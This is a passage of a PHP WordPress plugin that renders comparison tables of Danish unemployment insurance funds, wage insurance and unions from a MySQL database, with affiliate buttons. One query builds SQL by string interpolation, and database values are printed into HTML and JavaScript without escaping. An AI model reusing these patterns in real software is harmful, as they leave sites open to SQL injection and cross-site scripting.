    $affiliate_url = $row_list["AFFILIATE_URL"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
    $udbyder = $row_list["UDBYDER"];
	$id = $row_list["ID"];
	$recomended = $row_list["recomended"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	if ($aktiv != 0) {
?>
<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?>>
<td class="tabel-center-middel"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span></td>
<td  class="tabel-center-middel" style=" <?php if ($tp >= 4.5 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><b><?php echo $tp; ?> &#9733;</b></td>
<td  class="tabel-center-middel"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu."><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'bedste', 'bedste_akasser' );
}


function bedste_akasser_custom($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>
@media (max-width:768px) {
	#bedste_akasser_custom .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#bedste_akasser_custom .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#bedste_akasser_custom .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 55px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#bedste_akasser_custom .course_ribbon_box {
	display:none;
	}
	#bedste_akasser_custom .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#bedste_akasser_custom .hide-small {
		display:none;
	}
	#bedste_akasser_custom .stack-small {
		display:block!important;
		padding-bottom: 0px!important;
	}
	#bedste_akasser_custom .stack-high{
	padding-bottom: 70px!important;
    padding-top: 15px!important;

	}
	#bedste_akasser_custom .recomended_box {
    position: relative;
	}
	#bedste_akasser_custom .course_ribbon_box {
		display:none;
	}
	#bedste_akasser_custom .tabel-center-middel-oversigt {
    position: inherit!important;

	}
	#bedste_akasser_custom {
		position:relative;
	}
}
</style>
  <div class="table-responsive">
        <table class="table" style="max-width: 600px;" id="bedste_akasser_custom">
<thead>
<th class="tabel-center-middel">Bedste a-kasser</th>
<th  class="tabel-center-middel">Score</th>
<th  class="hidden-xs hidden-sm hide-small" style="border-bottom:none" ></th>
</thead>
<tbody>
<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY SCORE DESC, prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$score = $row_list["SCORE"];
	$id = $row_list["ID"];
    $udbyder = $row_list["UDBYDER"];
	// $recomended = $row_list["recomended"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	if ($aktiv != 0 && $score>0) {
?>
<tr>
<td class="tabel-center-middel stack-high" ><img src="<?php echo $logo; ?>" alt="Bedste a-kasse fra <?php echo $udbyder_display; ?>" data-toggle="tooltip" data-container="body" title="A-kasse fra <?php echo $udbyder_display; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?><?php
if(strpos($udbyder_display, "A-kasse") == false) {
echo " a-kasse";
}
?></span></td>
<td  class="tabel-center-middel stack-high" style="font-size:16px!important"><b><?php echo $score; ?></b><span class="denotion">/10</span></td>
<td  class="tabel-center-middel stack-small">
  <span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');" >Besøg a-kassen <span class="glyphicon glyphicon-circle-arrow-right"></span></span>
</td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'bedste_custom', 'bedste_akasser_custom' );
}


function bedste_akasser_custom_table($db) {
  ob_start();
  ?>
  <script>
       $(document).ready(function() {
      $('[data-toggle="tooltip"]').tooltip();
 
       })
 </script>
 
   <div class="table-responsive">
  <table class="table" style="max-width: 800px;" id="bedste_akasser_custom_table">
 <thead>
 <th>De bedste a-kasser</th>
 <th  class="tabel-center-middel">Score</th>
 <th  class="tabel-center-middel">Pris</th>
 <th  class="tabel-center-middel">Pris fagforening</th>
 <th  class="tabel-center-middel">Lønsikring</th>
 <th  class="tabel-center-middel">Trustpilot</th>
 <th  class="tabel-center-middel">Optager</th>
 </thead>
 <tbody>
 <?php
 global $db;
 $get_list = "SELECT * FROM data ORDER BY SCORE DESC, prio ASC";
 $result_list = $db->query($get_list);
 
 while ($row_list = mysqli_fetch_array($result_list)) {
   $aktiv = $row_list["ACTIVE"];
   $score = $row_list["SCORE"];
   $udbyder = $row_list["UDBYDER"];
   $udbyder_display = $row_list["udbyder_display"];
   $pris_mdr = $row_list["PRIS_MDR"];
   $TRUSTPILOT_SCORE = $row_list["TRUSTPILOT_SCORE"];
   $fagforening_pris = $row_list["fagforening_pris"];
   $optagelse = $row_list["OPTAGELSE"];
   if ($score>0) {
 ?>
 <tr>
 <td>
  <?php 
  echo $udbyder_display; 
  if(strpos($udbyder_display, "A-kasse") == false) {
    echo " a-kasse";
  }
  ?>
</td>
 <td  class="tabel-center-middel"><?php echo $score; ?><span class="denotion">/10</span></td>
 <td  class="tabel-center-middel"><?php echo $pris_mdr; ?> kr./md.</td>
 <td  class="tabel-center-middel">
  <?php if(!empty($fagforening_pris)) {
  echo $fagforening_pris; ?> kr./md.
  <?php } else { ?>
    <span class="denotion">Tilbydes ikke</span>
  <?php } ?>
</td>
 <td  class="tabel-center-middel">
    <?php
      $get_loensikring = "SELECT aktiv FROM loensikring_udbyder WHERE name='$udbyder' LIMIT 1";
      $result_loensikring = $db->query($get_loensikring);
      while ($row_loensikring = mysqli_fetch_array($result_loensikring)) {
          echo "Ja";
      }
    ?>
 </td>
 <td  class="tabel-center-middel"><?php echo $TRUSTPILOT_SCORE; ?></td>
 <td  class="tabel-center-middel"><?php echo $optagelse; ?></td>
 </tr>
 <?php
 }
 }
 ?>
 <?php
 global $db;
 $get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
 $result_updated = $db->query($get_updated);
 
 while ($row_updated = mysqli_fetch_array($result_updated)) {
 
      $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
 }
 ?>
 <tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
 </tbody>
 </table>
 </div>
 <?php
 return ob_get_clean();
    }
    global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'bedste_akasser_custom_table', 'bedste_akasser_custom_table' );
 }


 function studerende_gratis_table($db) {
  ob_start();
  ?>
  <script>
       $(document).ready(function() {
      $('[data-toggle="tooltip"]').tooltip();
 
       })
 </script>
 
   <div class="table-responsive">
  <table class="table" style="max-width: 800px;" id="studerende_gratis_table">
 <thead>
 <th>A-kasse</th>
 <th  class="tabel-center-middel">Pris for studerende</th>
 <th  class="tabel-center-middel">Normalpris</th>
 <th  class="tabel-center-middel">Fagforening</th>
 <th  class="tabel-center-middel">Optager</th>
 <th  class="tabel-center-middel">Tilmeld</th>
 </thead>
 <tbody>
 <?php
 global $db;
 $get_list = "SELECT * FROM data WHERE ACTIVE=1 ORDER BY prio ASC";
 $result_list = $db->query($get_list);
 
 while ($row_list = mysqli_fetch_array($result_list)) {
   $id = $row_list["ID"];
   $score = $row_list["SCORE"];
   $udbyder = $row_list["UDBYDER"];
   $udbyder_display = $row_list["udbyder_display"];
   $pris_mdr = $row_list["PRIS_MDR"];
   $fagforening_pris = $row_list["fagforening_pris"];
   $optagelse = $row_list["OPTAGELSE"];
 ?>
 <tr>
 <td>
  <?phpecho $udbyder_display; 
  if(strpos($udbyder_display, "A-kasse") == false) {
    echo " a-kasse";
  }
  ?>
</td>
 <td  class="tabel-center-middel">Gratis <span class="denotion">for studerende</span></td>
 <td  class="tabel-center-middel"><?php echo $pris_mdr; ?><span class="denotion"> kr./md.</span></td>
 <td  class="tabel-center-middel">
  <?php if(!empty($fagforening_pris)) {
  echo $fagforening_pris; ?><span class="denotion"> kr./md. </span>
  <?php } else { ?>
    <span class="denotion">Tilbydes ikke</span>
  <?php } ?>
 <td  class="tabel-center-middel"><span class="denotion"><?php echo $optagelse; ?></span></td>
 <td><span onclick="go_udbyder('<?php echo $id; ?>');" style="cursor:pointer;text-decoration:underline">Tilmeld</span></td>
 </tr>
 <?php
 }
 ?>
 <?php
 global $db;
 $get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
 $result_updated = $db->query($get_updated);
 
 while ($row_updated = mysqli_fetch_array($result_updated)) {
 
      $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
 }
 ?>
 <tr><td class="lastupdated" colspan="10" >Data i tabellen er senest opdateret: <?php echo $updated; ?></td></tr>
 </tbody>
 </table>
 </div>
 <?php
 return ob_get_clean();
    }
    global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'studerende_gratis_table', 'studerende_gratis_table' );
 }


 function loensikring_coverage($atts) {
  $a = shortcode_atts( array(
        "links" => "",
    ), $atts );
	global $links;
	$links = $a['links'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<?php if(!empty($links)) { ?>
<style>
@media (max-width:768px) {
	#loensikring_coverage .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#loensikring_coverage .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#loensikring_coverage .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 55px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#loensikring_coverage .course_ribbon_box {
	    width: 0px;
		position:inherit;
	}
    #loensikring_coverage .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -22px;
		width:100px;
	}
	#loensikring_coverage .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#loensikring_coverage .hide-small {
		display:none;
	}
	#loensikring_coverage .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#loensikring_coverage .stack-high{
	padding-bottom: 65px!important;
    padding-top: 20px!important;
	}
	#loensikring_coverage {
		position:relative;
	}
}
</style>
<?php } ?>
  <div class="table-responsive">
        <table class="table" style="max-width:620px;" id="loensikring_coverage">
<thead>
<th class="tabel-center-middel">Lønsikring fra</th>
<th  class="tabel-center-middel">Dækning</th>
<?php if(!empty($links)) { ?><th  class="tabel-center-middel hide-small">Se priser</th><?php } ?>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT loensikring_udbyder.*, data.* FROM loensikring_udbyder INNER JOIN data ON loensikring_udbyder.name=data.UDBYDER ORDER BY loensikring_udbyder.coverage DESC, data.prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["aktiv"];
    $affiliate_url = $row_list["url"];
	$coverage = $row_list["coverage"];
    $udbyder = $row_list["name"];
	$id = $row_list["ID"];
	$name_display = $row_list["name_display"];
	$logo = $row_list["logo"];
	if ($aktiv != 0) {
?>
<tr class="tr-oversigt">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $name_display; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name_display; ?>"/><?php if(!empty($links)) { ?><?php } ?><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span></td>
<td  class="tabel-center-middel stack-high"><b><?php echo $coverage; ?> %</b></td>
<?php if(!empty($links)) { ?><td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> SE PRIS</span></td><?php } ?>
</tr>
<?php
}
else {
?>
<tr class="tr-oversigt">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $udbyder; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $udbyder; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder; ?></span></td>
<td  class="tabel-center-middel stack-high"><b><?php echo $coverage; ?> %</b></td>
<?php if(!empty($links)) { ?><td  class="tabel-center-middel stack-small"><a href="<?php echo $affiliate_url; ?>" class="btn btn-block btn-primary btn-success" style="font-weight:600;" target="_blank" rel="nofollow"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</a></td><?php } ?>
</tr>
<?php
	}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'loensikring_coverage', 'loensikring_coverage' );
}


 function loensikring_no_akasse($atts) {
  $a = shortcode_atts( array(
        "links" => "",
    ), $atts );
	global $links;
	$links = $a['links'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
   <div class="swipe">
   <p><img src="/images/swipe.png" alt="swipe a-kasse"/>Swipe for at se fuld tabel</p>
   </div>
  <div class="table-responsive">
        <table class="table" style="max-width:620px;">
<thead>
<th class="tabel-center-middel">Lønsikring fra</th>
<th  class="tabel-center-middel">Priser fra</th>
<?php if(!empty($links)) { ?><th  class="tabel-center-middel"></th><?php } ?>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM loensikring_udbyder WHERE akasse_not_required = 1 ORDER BY aktiv DESC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["aktiv"];
	$not_req_prices_from = $row_list["not_req_prices_from"];
    $affiliate_url = $row_list["url"];
    $udbyder = $row_list["name"];
	$id = $row_list["id2"];
	$name_display = $row_list["name_display"];
	$logo = $row_list["logo"];
	if ($aktiv != 0) {
?>
<tr>
<td class="tabel-center-middel"><?php if(!empty($links)) { ?><span onclick="go_udbyder('<?php echo $id; ?>');"><?php } ?><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $name_display; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name_display; ?>"/><?php if(!empty($links)) { ?></span><?php } ?><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span></td>
<td  class="tabel-center-middel"><b><?php echo $not_req_prices_from; ?></b><span class="denotion"> kr.</span>
    <span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Dette er en 'fra' pris. Den endelige pris afhænger af den løn, du ønsker at forsikre."></span>
    </span></td>
<?php if(!empty($links)) { ?><td  class="tabel-center-middel"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> TJEK DIN PRIS</span></td><?php } ?>
</tr>
<?php
}
else {
?>
<tr>
<td class="tabel-center-middel"><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $udbyder; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $udbyder; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder; ?></span></td>
<td  class="tabel-center-middel"><b><?php echo $not_req_prices_from; ?></b><span class="denotion"> kr.</span>
    <span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Dette er en 'fra' pris. Den endelige pris afhænger af den løn, du ønsker at forsikre."></span>
    </span></td>
<?php if(!empty($links)) { ?><td  class="tabel-center-middel"></td><?php } ?>
</tr>
<?php
	}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'loensikring_no_akasse', 'loensikring_no_akasse' );
}

function loensikring_age($atts) {
  $a = shortcode_atts( array(
        "links" => '',
    ), $atts );
	global $links;
	$links = $a['links'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
   <div class="swipe">
   <p><img src="/images/swipe.png" alt="swipe a-kasse"/>Swipe for at se fuld tabel</p>
   </div>
  <div class="table-responsive">
        <table class="table" style="max-width:620px;">
<thead>
<th class="tabel-center-middel">Lønsikring fra </th>
<th  class="tabel-center-middel">Meld dig ind<br/>inden du fylder</th>
<th  class="tabel-center-middel">Dækning<br/>indtil du fylder</th>
<?php if(!empty($links)) { ?><th  class="tabel-center-middel"></th><?php } ?>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT loensikring_udbyder.*, data.* FROM loensikring_udbyder INNER JOIN data ON loensikring_udbyder.name=data.UDBYDER ORDER BY loensikring_udbyder.max_age DESC, data.prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["aktiv"];
	$max_age = $row_list["max_age"];
	$cover_age = $row_list["cover_age"];
    $affiliate_url = $row_list["url"];
	$base_url_internal = $row_list["base_url_internal"];
    $udbyder = $row_list["name"];
	$id = $row_list["ID"];
	$name_display = $row_list["name_display"];
	$logo = $row_list["logo"];
?>
<tr>
<td class="tabel-center-middel"><?php if(!empty($links)) { ?><a href="<?php	echo $base_url_internal; ?>" ><?php } ?><img src="<?php echo $logo; ?>" alt="Lønsikring fra <?php echo $name_display; ?>" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name_display; ?>"/><?php if(!empty($links)) { ?></a><?php } ?><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span></td>
<td  class="tabel-center-middel"><b><?php echo $max_age; ?></b><span class="denotion"> år</span>
    <span class="specs">Maks. alder <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Du skal være under <?php echo $max_age; ?> år for at tegne en lønsikring hos <?php echo $name_display; ?>"></span>
    </span></td>
    <td  class="tabel-center-middel"><b><?php echo $cover_age; ?></b><span class="denotion"> år</span>
    <span class="specs">Dækningsgrænse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Lønskring fra  <?php echo $name_display; ?> dækker indtil du fylder <?php echo $cover_age; ?> år."></span>
    </span></td>
<?php if(!empty($links)) { ?><td  class="tabel-center-middel"><span class="btn btn-block btn-primary btn-success" style="font-weight:bold;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE HER</span></td><?php } ?>
</tr>
<?php
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'loensikring_age', 'loensikring_age' );
}


 function akasser_optagelse($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>
@media (max-width:768px) {
	#akasser_optagelse .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#akasser_optagelse .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#akasser_optagelse .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 55px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#akasser_optagelse .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#akasser_optagelse .hide-small {
		display:none;
	}
	#akasser_optagelse .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#akasser_optagelse .stack-high{
	padding-bottom: 65px!important;
    padding-top: 20px!important;
	}
	#akasser_optagelse {
		position:relative;
	}
}
</style>
  <div class="table-responsive">
        <table class="table" id="akasser_optagelse" style="max-width:600px;">
<thead>
<th class="tabel-center-middel">A-kasse</th>
<th  class="tabel-center-middel">Optager</th>
<th  class="tabel-center-middel">Pris</th>
<th class="tabel-center-middel hide-small"></th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY PRIO ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
    $udbyder = $row_list["UDBYDER"];
	$pris = $row_list["PRIS_MDR"];
	$udbyder_display = $row_list["udbyder_display"];
	$medlemmer = $row_list["MEDLEMMER"];
	$optagelse = $row_list["OPTAGELSE"];
	$id = $row_list["ID"];
	$logo = $row_list["logo"];
	if ($aktiv != 0) {

?>
<tr>
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" class="tabel-logos" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span></td>
<td  class="tabel-center-middel stack-high"><?php echo $optagelse; ?></td>
<td  class="tabel-center-middel stack-high"><?php echo $pris; ?><span class="denotion"> kr.</span><span class="specs">Per md.</span></td>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span></td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'optagelse', 'akasser_optagelse' );
}

 function fagforeinger($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
  <div class="table-responsive">
<style>
@media (max-width:768px) {
	  #fagforeninger .tooltip-inner {
		 width:200px;
	  }
	#fagforeninger .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#fagforeninger .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#fagforeninger .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 0px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#fagforeninger .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#fagforeninger .hide-small {
		display:none;
	}
	#fagforeninger .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#fagforeninger .stack-high{
    padding-bottom: 80px!important;
    padding-top: 50px!important;
	}
}
</style>
        <table class="table" style="max-width:650px;position:relative" id="fagforeninger">
<thead>
<th class="tabel-center-middel">Fagforening</th>
<th  class="tabel-center-middel">Pris</th>
<th  class="tabel-center-middel">Pris inkl.<br/> a-kasse</th>
<th  class="tabel-center-middel header-oversigt hide-small">Score</th>
<th  class="tabel-center-middel header-oversigt hide-small"></th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY fagforening_pris ASC, prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
    $udbyder = $row_list["UDBYDER"];
	$samlerabat = $row_list["samlerabat"];
	$udbyder_display = $row_list["udbyder_display"];
	$fag_pris = $row_list["fagforening_pris"];
	$a_kasse_pris = $row_list["PRIS_MDR"];
	$id = $row_list["ID"];
	$base_url_internal = $row_list["base_url_internal"];
    $tp = $row_list["TRUSTPILOT_SCORE"];
	$logo = $row_list["logo"];
	if ($fag_pris > 0 && $a_kasse_pris > 0) {
?>
<tr class="tr-oversigt">
<td class="tabel-center-middel stack-high"><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" data-toggle="tooltip" data-container="body" title="a-kasse og fagforening fra <?php echo $udbyder_display; ?>"/></td>
<td  class="tabel-center-middel stack-high"><?php if($fag_pris == 0) { ?><span style=font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;padding-top:5px;padding-bottom:5px;">Tilbyder ikke<br/>fagforening</span><?php } else { ?><strong><?php echo $fag_pris; ?></strong><span class="denotion"> kr.</span><span class="specs">per md.</span><?php } ?></td>
<td class="tabel-center-middel stack-small"><?php if($fag_pris == 0) { ?><span style=font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Tilbyder ikke<br/>fagforening</span><?php } else { ?><?php echo $fag_pris+$a_kasse_pris-$samlerabat; ?><span class="denotion"> kr.</span><span class="specs">per md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;font-size: 12px;" data-toggle="tooltip" data-container="body" title="" data-original-title="Den samlede pris for a-kasse (<?php echo $a_kasse_pris; ?>) og fagforening (<?php echo $fag_pris; ?>) <?php if($samlerabat > 0) { ?>minus en samlerabat på <?php echo $samlerabat; ?> kr.<?php } ?>"></span></span><?php } ?></td>
<td  class="tabel-center-middel stack-small"><span  style=" <?php if ($tp >= 4.3 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><b><?php echo $tp; ?></b></span><span class="denotion">/5</span><span class="specs">på Trustpilot</span></td>
<td  class="tabel-center-middel stack-small">
<?php if ($aktiv == 0) { ?>
<a href="<?php echo $base_url_internal; ?>" class="btn btn-block btn-primary btn-success" style="font-weight:600;" ><span class="glyphicon glyphicon-circle-arrow-right"></span><?php if ($aktiv != 0) { ?> LÆS MERE<?php }  else { ?> LÆS MERE<?php } ?></a>
 <?php } else { ?>
<span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span><?php if ($aktiv != 0) { ?> LÆS MERE<?php }  else { ?> LÆS MERE<?php } ?></span>
  <?php }?>
</td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

